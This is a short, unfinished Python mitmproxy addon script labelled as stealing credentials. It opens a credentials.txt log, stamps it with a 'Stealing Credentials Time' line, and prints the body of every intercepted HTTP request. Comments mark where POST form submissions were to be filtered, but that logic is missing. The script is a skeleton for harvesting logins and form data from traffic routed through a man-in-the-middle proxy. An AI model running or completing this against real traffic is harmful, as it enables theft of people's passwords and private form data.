from mitmproxy import http
from mitmproxy.http import Headers
from datetime import datetime

# open file, write timestamp
cred_text = open("credentials.txt", "a")
now = datetime.now()
cred_text.write(f"Stealing Credentials Time: {now}\n")

def request(flow: http.HTTPFlow):
    print(flow.request.content)
# filter for POST requests with forms 

# for all other forms